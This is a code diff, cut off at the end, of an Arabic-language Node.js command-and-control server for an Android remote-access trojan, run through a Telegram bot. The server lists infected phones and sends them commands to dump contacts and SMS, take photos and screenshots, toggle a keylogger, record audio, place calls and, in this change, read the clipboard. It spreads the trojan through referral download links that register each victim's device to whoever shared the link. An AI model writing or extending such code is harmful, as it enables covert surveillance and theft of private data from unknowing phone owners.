@@ -9,7 +9,7 @@ const multer      = require("multer");
 const fs          = require("fs");
 
 // ═══════════════════════════════════════════════════════
-//   ⚙️ الإعدادات — قراءة من data.json
+//   ⚙️ الإعدادات
 // ═══════════════════════════════════════════════════════
 const DATA = JSON.parse(fs.readFileSync("./data.json", "utf8"));
 
@@ -26,20 +26,17 @@ const CONFIG = {
 };
 
 // ═══════════════════════════════════════════════════════
-//   🎨 أدوات رسم الحدود
+//   🎨 أدوات الحدود — عرض قصير (24)
 // ═══════════════════════════════════════════════════════
-const LINES = {
-  TOP:    "╔══════════════════════════════════════╗",
-  MID:    "╠══════════════════════════════════════╣",
-  BOT:    "╚══════════════════════════════════════╝",
-  SOFT:   "╟──────────────────────────────────────╢",
-  SEP:    "╬══════════════════════════════════════╬",
-  ARROW:  "╠═══ ═══ ═══ ═══ ═══ ═══ ═══ ═══ ═══ ╣"
-};
+const W = 24;
 
-function boxRow(text, width = 38, align = "center") {
-  const plain = text.replace(/\u001b\[[0-9;]*m/g, "");
-  const padding = Math.max(0, width - plain.length);
+function lineTop()  { return "╔" + "═".repeat(W) + "╗"; }
+function lineMid()  { return "╠" + "═".repeat(W) + "╣"; }
+function lineBot()  { return "╚" + "═".repeat(W) + "╝"; }
+
+function row(text, align = "center") {
+  const plain = String(text).replace(/<[^>]+>/g, "");
+  const padding = Math.max(0, W - plain.length - 2);
   let left, right;
   if (align === "center") {
     left  = Math.floor(padding / 2);
@@ -49,343 +46,326 @@ function boxRow(text, width = 38, align = "center") {
   } else {
     left = padding - 1; right = 1;
   }
-  return `║${" ".repeat(left)}${text}${" ".repeat(right)}║`;
-}
-
-function boxTitle(title) {
-  return `${LINES.TOP}\n${boxRow(title, 38, "center")}\n${LINES.MID}`;
-}
-
-function boxBottom() {
-  return LINES.BOT;
+  return "║ " + " ".repeat(left) + text + " ".repeat(right) + " ║";
 }
 
 // ═══════════════════════════════════════════════════════
-//   🎨 النصوص مع الحدود الفخمة
+//   🎨 النصوص
 // ═══════════════════════════════════════════════════════
 const TEXT = {
   MAIN_MENU:
-    `╔══════════════════════════════════════╗\n` +
-    `║         🎯 القائمة الرئيسية          ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("🎯 القائمة الرئيسية") + "\n" +
+    lineBot(),
 
   CONTROL_MENU:
-    `╔══════════════════════════════════════╗\n` +
-    `║          ⚡ لوحة التحكم ⚡             ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  💎 الجهاز: {device}\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("⚡ لوحة التحكم") + "\n" +
+    lineMid() + "\n" +
+    row("💎 {device}", "left") + "\n" +
+    lineBot(),
 
   SELECT_DEVICE:
-    `╔══════════════════════════════════════╗\n` +
-    `║         🎯 اختر الجهاز                ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("🎯 اختر الجهاز") + "\n" +
+    lineBot(),
 
   NO_DEVICE:
-    `╔══════════════════════════════════════╗\n` +
-    `║     ⚠️  لا يوجد جهاز متصل           ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("⚠️ لا يوجد جهاز") + "\n" +
+    lineBot(),
 
   NO_TARGET:
-    `╔══════════════════════════════════════╗\n` +
-    `║      ❌ اختر جهازاً أولاً             ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("❌ اختر جهازاً أولاً") + "\n" +
+    lineBot(),
 
   SUCCESS:
-    `╔══════════════════════════════════════╗\n` +
-    `║       ✅ تم تنفيذ الطلب               ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("✅ تم تنفيذ الطلب") + "\n" +
+    lineBot(),
 
   DEVICE_ONLINE:
-    `╔══════════════════════════════════════╗\n` +
-    `║         🟢 جهاز متصل                 ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  📱 {model}\n` +
-    `║  🔢 {version}\n` +
-    `║  🌐 {ip}\n` +
-    `║  ⏰ {time}\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("🟢 جهاز متصل") + "\n" +
+    lineMid() + "\n" +
+    row("📱 {model}", "left") + "\n" +
+    row("🔢 {version}", "left") + "\n" +
+    row("🌐 {ip}", "left") + "\n" +
+    row("⏰ {time}", "left") + "\n" +
+    lineBot(),
 
   DEVICE_OFFLINE:
-    `╔══════════════════════════════════════╗\n` +
-    `║         🔴 جهاز انفصل                ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  📱 {model}\n` +
-    `║  🌐 {ip}\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("🔴 جهاز انفصل") + "\n" +
+    lineMid() + "\n" +
+    row("📱 {model}", "left") + "\n" +
+    row("🌐 {ip}", "left") + "\n" +
+    lineBot(),
 
   FILE_RECEIVED:
-    `╔══════════════════════════════════════╗\n` +
-    `║        📥 ملف مستلم                  ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  💎 {model}\n` +
-    `║  📁 {filename}\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("📥 ملف مستلم") + "\n" +
+    lineMid() + "\n" +
+    row("💎 {model}", "left") + "\n" +
+    row("📁 {filename}", "left") + "\n" +
+    lineBot(),
 
   FILE_LIST:
-    `╔══════════════════════════════════════╗\n` +
-    `║       📂 نظام الملفات                ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  💎 {model}\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("📂 نظام الملفات") + "\n" +
+    lineMid() + "\n" +
+    row("💎 {model}", "left") + "\n" +
+    lineBot(),
 
   FILE_ACTION:
-    `╔══════════════════════════════════════╗\n` +
-    `║        ⚙️  إجراء الملف               ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  📁 {name}\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("⚙️ إجراء الملف") + "\n" +
+    lineMid() + "\n" +
+    row("📁 {name}", "left") + "\n" +
+    lineBot(),
 
   MESSAGE_FROM:
-    `╔══════════════════════════════════════╗\n` +
-    `║         📩 رسالة جديدة               ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  💎 من: {model}\n` +
-    `║  📝 {msg}\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("📩 رسالة جديدة") + "\n" +
+    lineMid() + "\n" +
+    row("💎 {model}", "left") + "\n" +
+    row("📝 {msg}", "left") + "\n" +
+    lineBot(),
 
   AUTH_REQUIRED:
-    `╔══════════════════════════════════════╗\n` +
-    `║        🔐 بوت محمي                   ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║      🎫 أرسل كود التفعيل            ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("🔐 بوت محمي") + "\n" +
+    lineMid() + "\n" +
+    row("🎫 أرسل الكود", "left") + "\n" +
+    lineBot(),
 
   AUTH_WRONG:
-    `╔══════════════════════════════════════╗\n` +
-    `║        ❌ كود غير صحيح               ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("❌ كود غير صحيح") + "\n" +
+    lineBot(),
 
   AUTH_EXPIRED:
-    `╔══════════════════════════════════════╗\n` +
-    `║        ⏰ كود منتهي                  ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("⏰ كود منتهي") + "\n" +
+    lineBot(),
 
   AUTH_USED:
-    `╔══════════════════════════════════════╗\n` +
-    `║        ⚠️  كود مستخدم                ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("⚠️ كود مستخدم") + "\n" +
+    lineBot(),
 
   AUTH_SUCCESS:
-    `╔══════════════════════════════════════╗\n` +
-    `║        ✅ تم التفعيل                 ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  ⏱️  المدة: {duration}\n` +
-    `║  📅 ينتهي: {date}\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("✅ تم التفعيل") + "\n" +
+    lineMid() + "\n" +
+    row("⏱️ {duration}", "left") + "\n" +
+    row("📅 {date}", "left") + "\n" +
+    lineBot(),
 
   ASK_CONTACT:
-    `╔══════════════════════════════════════╗\n` +
-    `║        📇 خطوة إلزامية               ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  ⚠️  احفظ البوت في جهات اتصالك      ║\n` +
-    `║                                      ║\n` +
-    `║  🆔 ثم أرسل آيديك (من @userinfobot)  ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("📇 خطوة إلزامية") + "\n" +
+    lineMid() + "\n" +
+    row("احفظ البوت", "left") + "\n" +
+    row("في جهات اتصالك", "left") + "\n" +
+    lineBot(),
 
   ASK_USER_ID:
-    `╔══════════════════════════════════════╗\n` +
-    `║   🆔 أرسل آيدي التلجرام الخاص بك     ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("🆔 أرسل آيديك") + "\n" +
+    row("من @userinfobot") + "\n" +
+    lineBot(),
 
   ID_MISMATCH:
-    `╔══════════════════════════════════════╗\n` +
-    `║     ❌ الآيدي لا يطابق حسابك!        ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  🆔 آيديك: <code>{realId}</code>\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("❌ آيدي خاطئ") + "\n" +
+    lineMid() + "\n" +
+    row("🆔 {realId}", "left") + "\n" +
+    lineBot(),
 
   ID_INVALID:
-    `╔══════════════════════════════════════╗\n` +
-    `║    ❌ أرسل رقماً صحيحاً               ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("❌ رقم غير صحيح") + "\n" +
+    lineBot(),
 
   APK_DELIVERED:
-    `╔══════════════════════════════════════╗\n` +
-    `║        🎉 تم التحقق                  ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  🔗 رابطك الخاص:\n` +
-    `║  <code>{shareLink}</code>\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  📌 شارك الرابط مع أصدقائك          ║\n` +
-    `║  كل من يحمّل التطبيق → يُسجّل عندك   ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  🆔 كودك: <code>{refCode}</code>\n` +
-    `║  👥 أجهزتك: {count}\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("🎉 تم التحقق") + "\n" +
+    lineMid() + "\n" +
+    row("🔗 رابطك:", "left") + "\n" +
+    row("<code>{shareLink}</code>", "left") + "\n" +
+    lineMid() + "\n" +
+    row("🆔 {refCode}", "left") + "\n" +
+    row("👥 {count} أجهزة", "left") + "\n" +
+    lineBot(),
 
   MY_STATS:
-    `╔══════════════════════════════════════╗\n` +
-    `║        📊 إحصائياتك                  ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  🆔 {refCode}\n` +
-    `║  👥 أجهزة: {count}\n` +
-    `║  🔗 {shareLink}\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("📊 إحصائياتك") + "\n" +
+    lineMid() + "\n" +
+    row("🆔 {refCode}", "left") + "\n" +
+    row("👥 {count} أجهزة", "left") + "\n" +
+    lineBot(),
 
-  OWNER_WELCOME:  `\n\n╔═══ 👑 مالك البوت ═══╗`,
-  USER_WELCOME:   `\n\n╔═══ ✅ مصرح لك ═══╗\n║ ⏱️ متبقي: {remaining} دقيقة`,
+  OWNER_WELCOME:  "\n\n╔══ 👑 مالك البوت ══╗",
+  USER_WELCOME:   "\n\n╔══ ✅ مصرح لك ══╗\n║ ⏱️ {remaining} دقيقة",
 
   CREATE_CODE_PROMPT:
-    `╔══════════════════════════════════════╗\n` +
-    `║         🔑 إنشاء كود                 ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  📩 أرسل المدة بالدقائق              ║\n` +
-    `║                                      ║\n` +
-    `║  مثال: <code>1440</code> = يوم                 ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("🔑 إنشاء كود") + "\n" +
+    lineMid() + "\n" +
+    row("📩 المدة بالدقائق", "left") + "\n" +
+    row("مثال: 1440 = يوم", "left") + "\n" +
+    lineBot(),
 
   CREATE_CODE_DONE:
-    `╔══════════════════════════════════════╗\n` +
-    `║        ✅ تم الإنشاء                 ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  🔑 الكود: <code>{code}</code>\n` +
-    `║  ⏱️  المدة: {duration}\n` +
-    `║  📅 ينتهي: {date}\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("✅ تم الإنشاء") + "\n" +
+    lineMid() + "\n" +
+    row("🔑 {code}", "left") + "\n" +
+    row("⏱️ {duration}", "left") + "\n" +
+    row("📅 {date}", "left") + "\n" +
+    lineBot(),
 
   CREATE_CODE_INVALID:
-    `╔══════════════════════════════════════╗\n` +
-    `║     ❌ رقم غير صحيح                   ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("❌ رقم غير صحيح") + "\n" +
+    lineBot(),
 
   CREATE_CODE_CANCEL:
-    `╔══════════════════════════════════════╗\n` +
-    `║        ❌ تم الإلغاء                 ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("❌ تم الإلغاء") + "\n" +
+    lineBot(),
 
   STATS:
-    `╔══════════════════════════════════════╗\n` +
-    `║       📊 الإحصائيات                  ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  🟢 نشطين: {active}\n` +
-    `║  🔴 منتهين: {expired}\n` +
-    `║  🎫 أكواد جديدة: {unused}\n` +
-    `║  ✅ أكواد مستخدمة: {used}\n` +
-    `║  📱 أجهزة: {devices}\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("📊 الإحصائيات") + "\n" +
+    lineMid() + "\n" +
+    row("🟢 {active}", "left") + "\n" +
+    row("🔴 {expired}", "left") + "\n" +
+    row("🎫 {unused}", "left") + "\n" +
+    row("✅ {used}", "left") + "\n" +
+    row("📱 {devices}", "left") + "\n" +
+    lineBot(),
 
   NO_USERS:
-    `╔══════════════════════════════════════╗\n` +
-    `║     👥 لا يوجد مستخدمين              ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("👥 لا يوجد مستخدمين") + "\n" +
+    lineBot(),
 
   USERS_HEADER:
-    `╔══════════════════════════════════════╗\n` +
-    `║         👥 المستخدمين                ║\n` +
-    `╚══════════════════════════════════════╝\n\n`,
+    lineTop() + "\n" +
+    row("👥 المستخدمين") + "\n" +
+    lineBot() + "\n\n",
 
   USER_ITEM:
-    `╔══════════════════════════════════════╗\n` +
-    `║  👤 {index}. {status}\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  🆔 <code>{id}</code>\n` +
-    `║  🎫 كود: <code>{code}</code>\n` +
-    `║  🔗 ref: <code>{refCode}</code>\n` +
-    `║  ⏱️  متبقي: {remaining}\n` +
-    `╚══════════════════════════════════════╝\n\n`,
+    lineTop() + "\n" +
+    row("👤 {index}. {status}", "left") + "\n" +
+    lineMid() + "\n" +
+    row("🆔 {id}", "left") + "\n" +
+    row("🎫 {code}", "left") + "\n" +
+    row("⏱️ {remaining}", "left") + "\n" +
+    lineBot() + "\n\n",
 
   START:
-    `╔══════════════════════════════════════╗\n` +
-    `║                                      ║\n` +
-    `║        🚀 بوت التحكم                 ║\n` +
-    `║                                      ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  📱 تحكم بأي هاتف أندرويد            ║\n` +
-    `║                                      ║\n` +
-    `║  🇩🇿 المطور: عبدو الشلفاوي            ║\n` +
-    `║  📡 @l2_dc                         ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("🚀 بوت التحكم") + "\n" +
+    lineMid() + "\n" +
+    row("📱 تحكم أندرويد", "left") + "\n" +
+    row("🇩🇿 عبدو الشلفاوي", "left") + "\n" +
+    row("📡 @l2_dc", "left") + "\n" +
+    lineBot(),
 
   DEV_INFO:
-    `╔══════════════════════════════════════╗\n` +
-    `║          👑 المطور                   ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  💎 عبدو الشلفاوي 🇩🇿                 ║\n` +
-    `║  📡 @l2_dc                         ║\n` +
-    `║  🔗 t.me/sx2teamcrack                ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("👑 المطور") + "\n" +
+    lineMid() + "\n" +
+    row("💎 عبدو الشلفاوي", "left") + "\n" +
+    row("📡 @l2_dc", "left") + "\n" +
+    lineBot(),
 
   DEVICE_COUNT_HEADER:
-    `╔══════════════════════════════════════╗\n` +
-    `║      📱 الأجهزة المتصلة              ║\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  🟢 العدد: {count}\n` +
-    `╚══════════════════════════════════════╝\n\n`,
+    lineTop() + "\n" +
+    row("📱 الأجهزة المتصلة") + "\n" +
+    lineMid() + "\n" +
+    row("🟢 العدد: {count}", "left") + "\n" +
+    lineBot() + "\n\n",
 
   DEVICE_COUNT_ITEM:
-    `╔══════════════════════════════════════╗\n` +
-    `║  💎 الجهاز #{index}\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║  📱 {model}\n` +
-    `║  🔢 {version}\n` +
-    `║  🌐 {ip}\n` +
-    `║  ⏰ {time}\n` +
-    `╚══════════════════════════════════════╝\n\n`,
+    lineTop() + "\n" +
+    row("💎 الجهاز #{index}", "left") + "\n" +
+    lineMid() + "\n" +
+    row("📱 {model}", "left") + "\n" +
+    row("🔢 {version}", "left") + "\n" +
+    row("🌐 {ip}", "left") + "\n" +
+    lineBot() + "\n\n",
 
   ASK_MIC_DURATION:
-    `╔══════════════════════════════════════╗\n` +
-    `║     🎙 اكتب مدة التسجيل بالثواني    ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("🎙 مدة التسجيل") + "\n" +
+    row("بالثواني") + "\n" +
+    lineBot(),
 
   ASK_TOAST_TEXT:
-    `╔══════════════════════════════════════╗\n` +
-    `║       💬 اكتب نص الرسالة             ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("💬 اكتب النص") + "\n" +
+    lineBot(),
 
   ASK_SMS_NUMBER:
-    `╔══════════════════════════════════════╗\n` +
-    `║       📨 اكتب رقم الهاتف             ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("📨 اكتب الرقم") + "\n" +
+    lineBot(),
 
   ASK_SMS_TEXT:
-    `╔══════════════════════════════════════╗\n` +
-    `║       📨 الرقم: {number}\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║       ✍️ اكتب نص الرسالة            ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("📨 {number}", "left") + "\n" +
+    lineMid() + "\n" +
+    row("✍️ اكتب النص", "left") + "\n" +
+    lineBot(),
 
   ASK_VIBRATE_TIME:
-    `╔══════════════════════════════════════╗\n` +
-    `║   📳 اكتب مدة الاهتزاز بالثواني     ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("📳 مدة الاهتزاز") + "\n" +
+    row("بالثواني") + "\n" +
+    lineBot(),
 
   ASK_MASS_TEXT:
-    `╔══════════════════════════════════════╗\n` +
-    `║     📢 اكتب الرسالة الجماعية          ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("📢 الرسالة الجماعية") + "\n" +
+    lineBot(),
 
   ASK_CALL_NUMBER:
-    `╔══════════════════════════════════════╗\n` +
-    `║       📞 اكتب الرقم للاتصال           ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("📞 اكتب الرقم") + "\n" +
+    lineBot(),
 
   ASK_CALL_CONFIRM:
-    `╔══════════════════════════════════════╗\n` +
-    `║       📞 الرقم: {number}\n` +
-    `╠══════════════════════════════════════╣\n` +
-    `║    ✅ اكتب 'موافق' للتأكيد           ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("📞 {number}", "left") + "\n" +
+    lineMid() + "\n" +
+    row("اكتب 'موافق'", "left") + "\n" +
+    lineBot(),
 
   ASK_NOTIF_TEXT:
-    `╔══════════════════════════════════════╗\n` +
-    `║       🔔 اكتب نص الإشعار             ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("🔔 نص الإشعار") + "\n" +
+    lineBot(),
 
   ASK_NOTIF_URL:
-    `╔══════════════════════════════════════╗\n` +
-    `║       🔗 اكتب الرابط                  ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("🔗 اكتب الرابط") + "\n" +
+    lineBot(),
 
   ASK_VOICE:
-    `╔══════════════════════════════════════╗\n` +
-    `║        🎵 سجّل الصوت                 ║\n` +
-    `╚══════════════════════════════════════╝`,
+    lineTop() + "\n" +
+    row("🎵 سجّل الصوت") + "\n" +
+    lineBot(),
 
   ASK_ENCRYPT_KEY:
-    `╔══════════════════════════════════════╗\n` +
-    `║      🔐 ارسل كود التشفير             ║\n` +
-    `╚══════════════════════════════════════╝`
+    lineTop() + "\n" +
+    row("🔐 كود التشفير") + "\n" +
+    lineBot()
 };
 
 // ═══════════════════════════════════════════════════════
@@ -408,6 +388,7 @@ const BTN = {
   BACK_CAMERA:    "📷 خلفية 📷",
   FRONT_CAMERA:   "🤳 أمامية 🤳",
   MIC:            "🎙 تسجيل صوت 🎙",
+  CLIPBOARD:      "📋 الحافظة 📋",
   SCREENSHOT:     "📺 لقطة شاشة 📺",
   TOAST:          "💬 رسالة سفلية 💬",
   SMS:            "📨 إرسال SMS 📨",
@@ -425,6 +406,9 @@ const BTN = {
   CALL:           "☎️ اتصال ☎️"
 };
 
+// ═══════════════════════════════════════════════════════
+//   🔗 ربط الأزرار بالأوامر
+// ═══════════════════════════════════════════════════════
 const DIRECT_COMMANDS = {
   [BTN.CONTACTS]:     "contacts",
   [BTN.MESSAGES]:     "all-sms",
@@ -432,6 +416,7 @@ const DIRECT_COMMANDS = {
   [BTN.APPS]:         "apps",
   [BTN.BACK_CAMERA]:  "main-camera",
   [BTN.FRONT_CAMERA]: "selfie-camera",
+  [BTN.CLIPBOARD]:    "clipboard",
   [BTN.SCREENSHOT]:   "screenshot",
   [BTN.KEYLOG_ON]:    "keylogger-on",
   [BTN.KEYLOG_OFF]:   "keylogger-off",
@@ -451,6 +436,9 @@ const INPUT_COMMANDS = {
   [BTN.ENCRYPT]:    { state: "encryptKey",         prompt: TEXT.ASK_ENCRYPT_KEY }
 };
 
+// ═══════════════════════════════════════════════════════
+//   🎨 لوحات المفاتيح
+// ═══════════════════════════════════════════════════════
 const KB = {
   MAIN: {
     keyboard: [
@@ -506,7 +494,7 @@ const appData  = new Map();
 const OWNER_ID = CONFIG.OWNER_ID;
 
 // ═══════════════════════════════════════════════════════
-//   💾 قاعدة البيانات (في الذاكرة)
+//   💾 قاعدة البيانات
 // ═══════════════════════════════════════════════════════
 let codes  = {};
 let users  = {};
@@ -560,18 +548,22 @@ function cleanIp(raw) {
   return String(raw).split(",")[0].trim().replace("::ffff:", "");
 }
 
+// ✅ الإصلاح: إرجاع الكائن مع الـ ID الصحيح
 function getVisibleDevices(userId) {
   const list = [];
-  io.sockets.sockets.forEach(s => {
-    if (String(userId) === OWNER_ID) list.push(s);
-    else if (s.ownerId === String(userId)) list.push(s);
+  io.sockets.sockets.forEach((s, id) => {
+    if (String(userId) === OWNER_ID) {
+      list.push({ socket: s, id: id });
+    } else if (s.ownerId === String(userId)) {
+      list.push({ socket: s, id: id });
+    }
   });
   return list;
 }
 
 function getCurrentDeviceName() {
   const t = appData.get("currentTarget");
-  const s = t && io.sockets.sockets.get(t);
+  const s = t ? io.sockets.sockets.get(t) : null;
   return s ? s.model : "unknown";
 }
 
@@ -586,9 +578,7 @@ function stayInControl(chatId, deviceName) {
 //   🌐 Express
 // ═══════════════════════════════════════════════════════
 app.get("/", (_req, res) => {
-  res.send(`╔══════════════════════════════════════╗
-║     ⚡ Server Online ⚡              ║
-╚══════════════════════════════════════╝`);
+  res.send("⚡ Server Online ⚡");
 });
 
 app.get("/join", (req, res) => {
@@ -622,14 +612,11 @@ app.get("/download", (req, res) => {
 
   if (ip) {
     ipRefs[ip] = { ref, savedAt: Date.now() };
-    console.log(`╔═══ 🔗 IP مرتبط ═══╗`);
-    console.log(`║  IP: ${ip}`);
-    console.log(`║  REF: ${ref}`);
-    console.log(`╚═══════════════════╝`);
+    console.log(`[+] IP: ${ip} → REF: ${ref}`);
   }
 
   if (!CONFIG.APK_URL) {
-    return res.status(404).send("❌ رابط APK غير معد في data.json");
+    return res.status(404).send("❌ رابط APK غير معد");
   }
 
   res.redirect(CONFIG.APK_URL);
@@ -675,16 +662,11 @@ io.on("connection", socket => {
   socket.refCode = refCode;
   socket.ownerId = ownerId;
 
-  console.log(`╔═══ 📱 جهاز متصل ═══╗`);
-  console.log(`║  📱 ${model}`);
-  console.log(`║  🌐 ${ip}`);
-  console.log(`║  🔗 ${refCode}`);
-  console.log(`║  👤 ${ownerId || "owner"}`);
-  console.log(`╚═══════════════════╝`);
+  console.log(`[+] جهاز: ${model} | IP: ${ip} | REF: ${refCode}`);
 
   bot.sendMessage(OWNER_ID, fill(TEXT.DEVICE_ONLINE, {
     model, version, ip, time: new Date().toLocaleString("ar-DZ")
-  }) + (ownerId ? `\n\n👤 صاحب الجهاز: <code>${ownerId}</code>` : ""),
+  }) + (ownerId ? `\n👤 صاحب: <code>${ownerId}</code>` : ""),
   { parse_mode: "HTML" }).catch(() => {});
 
   if (ownerId && ownerId !== OWNER_ID) {
@@ -760,7 +742,7 @@ bot.on("message", async msg => {
           appData.delete(USER_ID + "_awaitCode");
           appData.set(USER_ID + "_awaitId", true);
 
-          return bot.sendMessage(USER_ID, TEXT.ASK_CONTACT + "\n\n" + TEXT.ASK_USER_ID, {
+          return bot.sendMessage(USER_ID, TEXT.ASK_CONTACT, {
             parse_mode: "HTML",
             reply_markup: { remove_keyboard: true }
           });
@@ -897,11 +879,9 @@ bot.on("message", async msg => {
       const u = users[USER_ID];
       if (!u) return;
       const myDevices = getVisibleDevices(USER_ID).length;
-      const shareLink = `${CONFIG.SERVER_URL}/join?ref=${u.refCode}`;
       return bot.sendMessage(USER_ID, fill(TEXT.MY_STATS, {
         refCode: u.refCode,
-        count: myDevices,
-        shareLink
+        count: myDevices
       }), { parse_mode: "HTML" });
     }
 
@@ -982,10 +962,10 @@ bot.on("message", async msg => {
         return bot.sendMessage(USER_ID, TEXT.NO_DEVICE, { parse_mode: "HTML" });
       }
       let out = fill(TEXT.DEVICE_COUNT_HEADER, { count: devices.length });
-      devices.forEach((s, i) => {
+      devices.forEach((item, i) => {
+        const s = item.socket;
         out += fill(TEXT.DEVICE_COUNT_ITEM, {
-          index: i + 1, model: s.model, version: s.version, ip: s.ip,
-          time: new Date().toLocaleString("ar-DZ")
+          index: i + 1, model: s.model, version: s.version, ip: s.ip
         });
       });
       return bot.sendMessage(USER_ID, out, { parse_mode: "HTML" });
@@ -997,7 +977,7 @@ bot.on("message", async msg => {
         return bot.sendMessage(USER_ID, TEXT.NO_DEVICE, { parse_mode: "HTML" });
       }
       const rows = [];
-      devices.forEach(s => rows.push([s.model]));
+      devices.forEach(item => rows.push([item.socket.model]));
       rows.push([BTN.BACK_HOME]);
       return bot.sendMessage(USER_ID, TEXT.SELECT_DEVICE, {
         parse_mode: "HTML",
@@ -1030,11 +1010,11 @@ bot.on("message", async msg => {
     // ═══ اختيار جهاز ═══
     let foundDevice = false;
     const visibleDevices = getVisibleDevices(USER_ID);
-    visibleDevices.forEach(s => {
-      if (USER_TEXT === s.model) {
-        appData.set("currentTarget", s.id);
+    visibleDevices.forEach(item => {
+      if (USER_TEXT === item.socket.model) {
+        appData.set("currentTarget", item.id);
         foundDevice = true;
-        bot.sendMessage(USER_ID, fill(TEXT.CONTROL_MENU, { device: s.model }), {
+        bot.sendMessage(USER_ID, fill(TEXT.CONTROL_MENU, { device: item.socket.model }), {
           parse_mode: "HTML", reply_markup: KB.CONTROL
         });
       }
@@ -1075,7 +1055,7 @@ bot.on("message", async msg => {
     }
 
   } catch (err) {
-    console.error("❌ خطأ:", err);
+    console.error("❌", err.message);
   }
 });
 
@@ -1171,18 +1151,12 @@ setInterval(() => {
 //   🚀 التشغيل
 // ═══════════════════════════════════════════════════════
 server.listen(CONFIG.PORT, () => {
-  console.log(`
-╔══════════════════════════════════════════════════════════╗
-║                                                          ║
-║              ⚡  S E R V E R   O N L I N E  ⚡            ║
-║                                                          ║
-╠══════════════════════════════════════════════════════════╣
-║  📡 المنفذ:  ${String(CONFIG.PORT).padEnd(43)}║
-║  🔗 الرابط:  ${String(CONFIG.SERVER_URL).slice(0, 43).padEnd(43)}║
-║  📦 APK:     ${String(CONFIG.APK_URL || "غير معد").slice(0, 43).padEnd(43)}║
-║  🤖 البوت:   ${String(CONFIG.BOT_TOKEN ? "مفعّل ✅" : "❌ غير مفعّل").padEnd(43)}║
-╚══════════════════════════════════════════════════════════╝
-`);
+  console.log("╔══════════════════════════╗");
+  console.log("║   ⚡ SERVER ONLINE ⚡     ║");
+  console.log("╠══════════════════════════╣");
+  console.log("║  📡 PORT: " + String(CONFIG.PORT).padEnd(15) + "║");
+  console.log("║  🤖 BOT:  " + String(CONFIG.BOT_TOKEN ? "✅" : "❌").padEnd(15) + "║");
